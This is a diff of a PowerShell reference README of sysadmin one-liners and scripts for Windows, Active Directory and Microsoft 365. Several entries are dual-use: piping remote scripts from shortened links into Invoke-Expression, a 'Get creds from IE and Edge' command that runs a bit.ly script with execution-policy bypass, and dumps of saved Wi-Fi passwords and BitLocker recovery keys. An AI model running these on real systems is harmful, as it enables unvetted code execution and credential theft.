@@ -1,13 +1,17 @@
 ![header](https://capsule-render.vercel.app/api?type=waving&color=012456&fontColor=ffffff&height=150&section=header&fontAlignY=38&text=Powershell%20Reference&fontSize=60)
 
-A collection of commands, code snippets, and scripts tailored for managing and automating tasks in a Windows environment. Designed for experienced administrators, this resource delves beyond basic PowerShell usage, offering practical solutions for variety of scenarios. 
+# Powershell Reference
 
+A collection of commands, code snippets, and scripts tailored for managing and automating tasks in a Windows environment. Designed for experienced administrators, this resource delves beyond basic PowerShell usage, offering practical solutions for a variety of scenarios.
 
-You can access a number of these commands via a simple menu by running the following command. The commands are defined in `commands.json` located in this repo 
+You can access a number of these commands via a simple menu by running the following command. The commands are defined in `commands.json` located in this repo
+
 ```powershell
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/superswan/Powershell-SysAdmin/refs/heads/master/psreference.ps1" -UseBasicParsing | Invoke-Expression
 ```
+
 **Short Version:**
+
 ```powershell
 iwr https://s.lain.la/xSR3y | iex 
 ```
@@ -21,112 +25,137 @@ iwr https://s.lain.la/xSR3y | iex
 * [Windows Defender](#windows-defender)
 * [Fun](#fun)
 
-#### Install Winget 
+#### Install Winget
 
 ```powershell
 Invoke-WebRequest -Uri "https://github.com/microsoft/winget-cli/releases/latest/download/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle" -OutFile "C:\WinGet.msixbundle"
 Add-AppxPackage "C:\WinGet.msixbundle"
 Add-AppxPackage -RegisterByFamilyName -MainPackage Microsoft.Winget.Source_8wekyb3d8bbwe
 ```
+
 ---
+
 ## Practice
+
 Not sure if the slack channel is active usually it's the name of the exercise with a 1 at the end like `century1`
 
 [Under The Wire](https://underthewire.tech)
 
 ## Combinging Powershell output with Linux programs (WSL2)
-If a wsl2 distro is installed commands from the default distro can be called with`wsl` this can be combined with `Convert-To-JSON` to use common linux data-wrangling tools like `awk`, `sed`, and `grep`
+
+If a wsl2 distro is installed commands from the default distro can be called with `wsl` this can be combined with `Convert-To-JSON` to use common linux data-wrangling tools like `awk`, `sed`, and `grep`
+
 ```powershell
 get-hotfix | ConvertTo-Json | wsl jq '.[] | .HotFixID' | wsl sort
 ```
 
 ## One-Liners
----
 
 #### Close All Open Windows
+
 ```
 Get-Process | Where-Object { $_.MainWindowTitle } | Stop-Process
 ```
 
 #### Kill processes by company/vendor
+
 Like when you can't uninstall Creative Cloud
+
 ```powershell
 Get-Process | Where-Object {$_.Company -like "*Adobe*"} | Stop-Process -Force
 ```
 
 #### Get Shutdown Events
+
 ```
 Get-WinEvent -LogName System | Where-Object { $_.ID -eq 6006 -or $_.ID -eq 6008 -or $_.ID -eq 1074 } | Format-List -Property TimeCreated, ID, Message
 ```
 
 #### Get Active Directory User Info
+
 ```
 Get-ADUser -Filter "Name -like '*partofname*'"
 ```
 
 #### Get Domain Name
-```$domain = []::GetCurrentDomain().Name```
+
+``$domain = []::GetCurrentDomain().Name``
 
 #### Find Domain Controller using DNS
-```Resolve-DnsName -Name "_ldap._tcp.dc._msdcs.$domainName" -QueryType SRV```
+
+``Resolve-DnsName -Name "_ldap._tcp.dc._msdcs.$domainName" -QueryType SRV``
 
 #### "Pong Command" - Listen for Pings. Uses WinDump.exe
-```.\WinDump.exe -i 3 icmp and icmp[icmp-echoreply]=icmp-echo```
+
+``.\WinDump.exe -i 3 icmp and icmp[icmp-echoreply]=icmp-echo``
 
 #### Enable/Disable Firewall (All Profiles)
-```Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False```
+
+``Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False``
 
 #### Enable File and Printer Sharing
-```Set-NetFirewallRule -DisplayGroup "File And Printer Sharing" -Enabled True```
+
+``Set-NetFirewallRule -DisplayGroup "File And Printer Sharing" -Enabled True``
 
 #### Enable Linked Connections (Administrative and regular user accounts can see the same network shares)
-```reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f```
+
+``reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f``
 
 #### Enable ICMP
-```netsh advfirewall firewall add rule name="Allow incoming ping requests IPv4" dir=in action=allow protocol=icmpv4 ```
+
+``netsh advfirewall firewall add rule name="Allow incoming ping requests IPv4" dir=in action=allow protocol=icmpv4 ``
 
 #### Prefer IPv4 over IPv6
+
 This adjusts the IPv6 prefix policies so that IPv4 addresses are preferred (Ping, DNS Resolution, etc.). Run both commands.
 
-```netsh int ipv6 set prefixpolicy ::ffff:0:0/96 46 4```
+``netsh int ipv6 set prefixpolicy ::ffff:0:0/96 46 4``
 
-```netsh int ipv6 set prefixpolicy ::/0 45 6```
+``netsh int ipv6 set prefixpolicy ::/0 45 6``
 
 #### Reset networking stack
-```netsh int ip reset```
 
-```netsh winsock reset```
+``netsh int ip reset``
 
-#### Forcefully open Internet Explorer 
-```mshta.exe "javascript:open();close();"```
+``netsh winsock reset``
+
+#### Forcefully open Internet Explorer
+
+``mshta.exe "javascript:open();close();"``
 
 ### Remote Manage
 
 #### Enable RDP
-```reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f```
+
+``reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f``
 
 #### Set NLA
-```Set-ItemProperty ‘HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\‘ -Name “UserAuthentication” -Value 1```
+
+``Set-ItemProperty ‘HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\‘ -Name “UserAuthentication” -Value 1``
 
 #### Firewall Rule
-```Enable-NetFirewallRule -DisplayGroup “Remote Desktop”```
+
+``Enable-NetFirewallRule -DisplayGroup “Remote Desktop”``
 
 #### Bloatware Remover (Outdated)
-```iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/debloat'))```
 
-#### Remote Event Viewer 
-```  Set-NetFirewallRule -DisplayGroup 'Remote Event Log Management' -Enabled True -PassThru```
+``iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/debloat'))``
+
+#### Remote Event Viewer
+
+``  Set-NetFirewallRule -DisplayGroup 'Remote Event Log Management' -Enabled True -PassThru``
 
 #### Update computers remotely
-``` Invoke-WuJob -ComputerName $Computers -Script { ipmo PSWindowsUpdate; Install-WindowsUpdate -AcceptAll -IgnoreReboot | Out-File "C:\Windows\PSWindowsUpdate.log"} -RunNow -Confirm:$false -Verbose -ErrorAction Ignore ```
+
+``Invoke-WuJob -ComputerName $Computers -Script { ipmo PSWindowsUpdate; Install-WindowsUpdate -AcceptAll -IgnoreReboot | Out-File "C:\Windows\PSWindowsUpdate.log"} -RunNow -Confirm:$false -Verbose -ErrorAction Ignore``
 
 #### Ctrl + WIN + Shift + B (GPU Reset)
-```Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Keyboard {[DllImport("user32.dll")]public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);}' ; [Keyboard]::keybd_event(0x11, 0, 0, 0); [Keyboard]::keybd_event(0x10, 0, 0, 0); [Keyboard]::keybd_event(0x5B, 0, 0, 0); [Keyboard]::keybd_event(0x42, 0, 0, 0); [Keyboard]::keybd_event(0x42, 0, 2, 0); [Keyboard]::keybd_event(0x5B, 0, 2, 0); [Keyboard]::keybd_event(0x10, 0, 2, 0); [Keyboard]::keybd_event(0x11, 0, 2, 0);```
 
+``Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Keyboard {[DllImport("user32.dll")]public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);}' ; [Keyboard]::keybd_event(0x11, 0, 0, 0); [Keyboard]::keybd_event(0x10, 0, 0, 0); [Keyboard]::keybd_event(0x5B, 0, 0, 0); [Keyboard]::keybd_event(0x42, 0, 0, 0); [Keyboard]::keybd_event(0x42, 0, 2, 0); [Keyboard]::keybd_event(0x5B, 0, 2, 0); [Keyboard]::keybd_event(0x10, 0, 2, 0); [Keyboard]::keybd_event(0x11, 0, 2, 0);``
 
 #### Get creds from IE and Edge
 
-```powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/2K75g15’)"```
+``powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/2K75g15’)"``
 
 ```
 [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] $vault = New-Object Windows.Security.Credentials.PasswordVault $vault.RetrieveAll() | ForEach {$vault.Remove($_)}
@@ -134,61 +163,75 @@ This adjusts the IPv6 prefix policies so that IPv4 addresses are preferred (Ping
 
 #### Count Mailboxes based on office or chosen property
 
-```Get-Mailbox | Group-Object -Property:Office | Select-Object name,count```
+``Get-Mailbox | Group-Object -Property:Office | Select-Object name,count``
 
 #### Get all PC Names according to pattern (requires activedirectory module)
-``` Get-ADComputer -Filter "Name -like 'PC-*'" | Select-String -Pattern PC-\d+```
+
+`` Get-ADComputer -Filter "Name -like 'PC-*'" | Select-String -Pattern PC-\d+``
 
 #### Get all computer names
-``` Get-ADComputer -Filter * | Select-Object -ExpandProperty Name ```
+
+``Get-ADComputer -Filter * | Select-Object -ExpandProperty Name``
 
 #### Get computer last logon
+
 ```
 Get-ADComputer -Filter * -Properties Name,OperatingSystem ,lastlogontimestamp | Select Name,OperatingSystem ,@{N='lastlogontimestamp'; E={[DateTime]::FromFileTime($_.lastlogontimestamp)}}
 ```
 
 #### Get current logged on user
-``` query user /server:$SERVER```
+
+`` query user /server:$SERVER``
 
 #### Get LastLogonDate/LastLogon for each computer
+
 ```
 Get-ADComputer -Filter * -Properties * | Sort LastLogon | Select Name, LastLogonDate,@{Name='LastLogon';Expression={[DateTime]::FromFileTime($_.LastLogon)}}
 ```
 
-### Get All Disabled Users (Excluding OU)
-```Search-ADAccount -AccountDisabled -UsersOnly | Where {$_.DistinguishedName -notlike "*OU=Disabled Users,OU=USERS,DC=EXAMPLE,DC=COM"}```
+#### Get All Disabled Users (Excluding OU)
+
+``Search-ADAccount -AccountDisabled -UsersOnly | Where {$_.DistinguishedName -notlike "*OU=Disabled Users,OU=USERS,DC=EXAMPLE,DC=COM"}``
 
 #### Get LastLogon for User
-```Get-ADUser -Identity “username” -Properties “LastLogonDate”```
+
+``Get-ADUser -Identity “username” -Properties “LastLogonDate”``
 
 #### Enable Hyper-V
-```Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All```
+
+``Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All``
 
 #### Toggle SMBv1
-```Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force```
 
-#### Enable script execution 
-```powershell.exe Set-ExecutionPolicy Bypass -Force```
+``Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force``
 
+#### Enable script execution
+
+``powershell.exe Set-ExecutionPolicy Bypass -Force``
 
 #### Retrieve Inventory of Installed Applications on remote computer (requires winget)
+
 `Invoke-Command -ComputerName COMPUTER-01 -ScriptBlock { winget list}`
 
 #### Scheduled Reboot
+
 `shutdown -r -t $([int]([datetime]"11PM"-(Get-Date)).TotalSeconds)`
 
 #### Restart Explorer
+
 ```
 gps explorer | spps
 ```
 
-#### WAC Management
+#### WAC and PowerShell Remote Management
+
 ```
 Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private
 Enable-PSRemoting -force
 ```
 
 #### Time Sync
+
 ```
 w32tm /query /status
 w32tm /config /manualpeerlist:"time.google.com,time.cloudflare.com,time.windows.com" /syncfromflags:manual /reliable:YES /update
@@ -197,8 +240,9 @@ w32tm /resync
 ```
 
 ## Snippets
----
-#### Reset Windows Update 
+
+#### Reset Windows Update
+
 ```powershell
 # Stop Windows Update Services
 Write-Host "Stopping Windows Update Services..."
@@ -248,6 +292,7 @@ Write-Host "Windows Update reset complete. You may need to restart your computer
 ```
 
 #### Inventory collection script (Logon script that pushes system info to share)
+
 ```powershell
 $filename = Join-Path -Path \\server-name\IT-Inventory\ -ChildPath "${env:COMPUTERNAME}.txt"
 
@@ -277,7 +322,7 @@ Get-ChildItem -Path $currentDirectory -File | ForEach-Object {
 
     # Create a hashtable to store the data for each file
     $dataHash = @{}
-    
+  
     # Parse each line and extract key-value pairs
     foreach ($line in $content) {
         if ($line -match "^(.*)\s+:\s+(.*)$") {
@@ -322,6 +367,7 @@ $customDataArray | Export-Csv -Path $outputCsv -NoTypeInformation
 ```
 
 #### Dump all Bitlocker IDs and Recovery Keys from Active Directory
+
 ```powershell
 
 Import-Module ActiveDirectory
@@ -341,6 +387,7 @@ $computers | Format-Table -AutoSize
 ```
 
 #### Batch convert HEIC to JPG (Requires ImageMagick)
+
 ```powershell
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
@@ -403,8 +450,9 @@ Convert-HEICtoPDF
 ```
 
 #### Push Updates to Remote Computers using Invoke-WuJob (PSWindowsUpdate)
+
 ```powershell
-$Computers = @("PMC01","PMC04","PMC06","PMC08","PMC-JOAN","PMC-SARA","LAWOFFICE-2","PMC03","PMC07")
+$Computers = @("PC01","PM04","PC06","PC08","PC-JOAN","PC-SARA","LAWOFFICE-2","PC03","PC07")
 $OnlineComputers = @()
 
 foreach ($Computer in $Computers) {
@@ -421,7 +469,9 @@ Invoke-WuJob -ComputerName $OnlineComputers -Script {
     Install-WindowsUpdate -AcceptAll -IgnoreReboot -MicrosoftUpdate | Out-File "C:\Windows\PSWindowsUpdate.log"
 } -RunNow -Confirm:$false -Verbose -ErrorAction Ignore
 ```
-#### Self-elevate script 
+
+#### Self-elevate script
+
 ```powershell
 if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
  if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
@@ -433,6 +483,7 @@ if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 ```
 
 #### Get logged in users for each computer
+
 ```powershell
 $COMPUTER_LIST = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name
 
@@ -444,7 +495,9 @@ echo `n
 ```
 
 #### Update PATH Environment Variable Dynamically
+
 Portable tools and programs are placed in a directory, loops over the directory and adds subfolders to PATH environment variable if they don't already exist.
+
 ```powershell
 $binPath = "C:\bin"
 Get-ChildItem -Path $binPath -Directory | ForEach-Object {
@@ -457,6 +510,7 @@ Get-ChildItem -Path $binPath -Directory | ForEach-Object {
 ```
 
 #### Schedule Reboot
+
 ```powershell
 $action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -command "& {Restart-Computer -Force -wait}"'
 $trigger = New-ScheduledTaskTrigger -Once -At 3am
@@ -477,6 +531,7 @@ TaskName = $taskname
 ```
 
 #### Toggle touch screen
+
 ```powershell
 $TouchScreenDevices = Get-PnpDevice | Where-Object { $_.FriendlyName -like "*HID-compliant touch screen*" }
 
@@ -492,6 +547,7 @@ foreach ($Device in $TouchScreenDevices) {
 ```
 
 #### List all installed software via Registry keys
+
 ```powershell
 $registryPaths = @(
     "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
@@ -509,6 +565,7 @@ $installedSoftware
 ```
 
 #### Get REG key of any installed program
+
 ```powershell
 $keys = dir HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall | where { $_.GetValueNames() -contains 'DisplayName' }
 $keys += dir HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall | where { $_.GetValueNames() -contains 'DisplayName' }
@@ -517,7 +574,9 @@ $k = $keys | where { $_.GetValue('DisplayName') -eq 'DISPLAYNAMEHERE' }
 ```
 
 #### Do maintenance
+
 **Requires PatchMyPC**
+
 ```powershell
 # Windows Update
 if ((Get-Module -ListAvailable -Name PSWindowsUpdate) -eq $null)
@@ -542,7 +601,8 @@ sfc /scannow
 cleanmgr.exe /full
 ```
 
-#### File organizer 
+#### File organizer
+
 ```powershell
 # PowerShell script to organize files into subdirectories based on file type, without moving existing directories
 # ! Use with caution there is no confirmation or undo !
@@ -596,6 +656,7 @@ Get-ChildItem -Path $directoryPath -File |
 ```
 
 #### Dump Wireless Password For All Profiles
+
 ```powershell
 $profiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}
 
@@ -612,12 +673,15 @@ foreach ($profile in $profiles) {
 ```
 
 #### Winget Bulk Install
-https://winstall.app 
+
+https://winstall.app
+
 ```powershell
 winget install --id=Microsoft.DotNet.Framework.DeveloperPack_4 -e  ; winget install --id=Google.Chrome -e  ; winget install --id=Microsoft.VCRedist.2013.x64 -e  ; winget install --id=Microsoft.VCRedist.2013.x86 -e  ; winget install --id=Microsoft.VCRedist.2015+.x64 -e  ; winget install --id=Microsoft.VCRedist.2015+.x86 -e  ; winget install --id=Microsoft.VCRedist.2012.x64 -e  ; winget install --id=Microsoft.VCRedist.2012.x86 -e  ; winget install --id=Microsoft.VCRedist.2010.x64 -e  ; winget install --id=Microsoft.VCRedist.2010.x86 -e  ; winget install --id=Microsoft.VCRedist.2005.x86 -e  ; winget install --id=Microsoft.VCRedist.2008.x86 -e  ; winget install --id=Microsoft.VCRedist.2008.x64 -e  ; winget install --id=Oracle.JavaRuntimeEnvironment -e  ; winget install --id=7zip.7zip -e  ; winget install --id=Adobe.Acrobat.Reader.64-bit -e 
 ```
 
 #### Install and configure Windows Subsystem for Linux (Server 2019)
+
 ```powershell
 Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
 
@@ -629,6 +693,7 @@ Expand-Archive .\debian\DistroLauncher-Appx_1.12.1.0_x64.appx
 ```
 
 #### List Mapped Network Printers with IP Address
+
 ```powershell
 $printers = Get-WmiObject -Query "SELECT * FROM Win32_Printer"
 foreach ($printer in $printers) {
@@ -644,26 +709,31 @@ foreach ($printer in $printers) {
 ```
 
 ## Active Directory
----
+
 ```
 Import-Module ActiveDirectory
 ```
 
 #### Locate all DCs
+
 ```powershell
 dig +noall +answer _ldap._tcp.dc._msdcs.<domain-name> SRV
 ```
+
 ```powershell
 nslookup -type=srv _ldap._tcp.dc._msdcs.<domain-name>
 ```
+
 ```powershell
 nltest /dclist:<your-domain-name>
 ```
+
 ```powershell
 Get-ADDomainController -Filter * | Select Name, HostName, Site
 ```
 
 #### Disable all stale computer accounts (90 days)
+
 ```powershell
 # Import the Active Directory module
 Import-Module ActiveDirectory
@@ -681,9 +751,9 @@ $StaleComputers = Get-ADComputer -Filter {LastLogonTimeStamp -lt $Date} -Propert
 foreach ($Computer in $StaleComputers) {
     $ComputerName = $Computer.Name
     $LastLogonDate = [datetime]::FromFileTime($Computer.LastLogonTimeStamp)
-    
+  
     Write-Host "Removing computer: $ComputerName (Last Logon: $LastLogonDate)"
-    
+  
     # Remove the computer account from Active Directory
     # Uncomment the next line to perform the deletion
     # Remove-ADComputer -Identity $Computer.DistinguishedName -Confirm:$false
@@ -693,7 +763,8 @@ foreach ($Computer in $StaleComputers) {
 Write-Host "Completed removal of stale computer accounts."
 ```
 
-#### Retrieve list of all DCs and assigned FSMO roles 
+#### Retrieve list of all DCs and assigned FSMO roles
+
 ```
 Import-Module ActiveDirectory
 
@@ -720,15 +791,17 @@ foreach ($DC in $DCs) {
 ```
 
 ## Microsoft 365
----
+
 #### Connect to Exchange Online
+
 ```
 Install-Module -Name ExchangeOnlineManagement
 Import-Module ExchangeOnlineManagement
 Connect-ExchangeOnline -UserPrincipalName <UPN> [-ExchangeEnvironmentName <Value>] [-ShowBanner:$false] [-DelegatedOrganization <String>] [-SkipLoadingFormatData]
 ```
 
-####  Exchange Online MailBox info (Mailbox size and Archive size) 
+#### Exchange Online MailBox info (Mailbox size and Archive size)
+
 ```powershell
 Get-Mailbox -RecipientTypeDetails UserMailbox | ForEach-Object {
     $mailboxStats = Get-MailboxStatistics $_.Identity
@@ -747,26 +820,30 @@ Get-Mailbox -RecipientTypeDetails UserMailbox | ForEach-Object {
 } | Select-Object DisplayName, PrimarySmtpAddress, ArchiveStatus, AutoExpandArchive, TotalItemSize, ArchiveSize
 ```
 
-
 ## Scripts
----
+
 * [HP Bloatware Removal](https://gist.github.com/mark05e/a79221b4245962a477a49eb281d97388) (varied results)
 * [AD Audit](https://github.com/phillips321/adaudit)
 * [Microsoft Official Windows Search Reset](https://www.microsoft.com/en-us/download/details.aspx?id=100295)
 * PSCmder (Really bad PDQ alternative, script and `commands.txt` are in this repo. Usefull for remote installation or command exec)
+* [CIS Critical Controls](https://github.com/robvandenbrink/Critical-Controls-v7)
 
 ## Windows Defender
+
 [Windows Defender is enough, if you harden it](https://gist.github.com/superswan/1d6ed59e75273f90a481428964be3ae5)
 
 ## Fun
----
+
 #### Final Fantasy Victory Beep
+
 ```
 [console]::beep(784,300); Start-Sleep -Milliseconds 100; [console]::beep(784,600); [console]::beep(622,600); [console]::beep(698,600); [console]::beep(784,200); Start-Sleep -Milliseconds 200; [console]::beep(698,200); [console]::beep(784,800)
 ```
 
 #### DVD Cursor
+
 Bounces cursor around the screen like the DVD logo
+
 ```
 Add-Type -AssemblyName System.Windows.Forms
 
@@ -795,7 +872,7 @@ while ($true) {
     }
 
     [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
-    
+  
     Start-Sleep -Milliseconds 50
 }
 ```
